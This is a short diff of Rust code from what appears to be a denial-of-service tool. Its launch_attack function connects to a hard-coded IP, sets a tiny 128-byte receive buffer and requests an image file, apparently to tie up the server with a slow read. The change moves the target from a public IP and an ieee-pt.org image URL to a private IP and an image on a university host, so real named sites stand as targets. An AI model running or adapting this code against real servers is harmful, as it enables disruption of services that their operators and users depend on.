@@ -21,12 +21,12 @@ fn main() {
 }
 
 fn launch_attack() -> impl Future<Item=(), Error=Error> {
-    let socket_addr: SocketAddr = "94.46.135.151:80".parse().unwrap();
+    let socket_addr: SocketAddr = "192.168.27.131:80".parse().unwrap();
     let tcp_stream = TcpStream::connect(&socket_addr).wait().unwrap();
 
     tcp_stream.set_recv_buffer_size(128usize);
 
-    let request = Request::get("http://up.ieee-pt.org/assets/images/header.jpg").body(()).unwrap();
+    let request = Request::get("https://ni.fe.up.pt/images/projects/PKyl13EDPj3HLxF4.png").body(()).unwrap();
     let request = build_http_request(&request);
 
     io::write_all(&tcp_stream, request).wait();
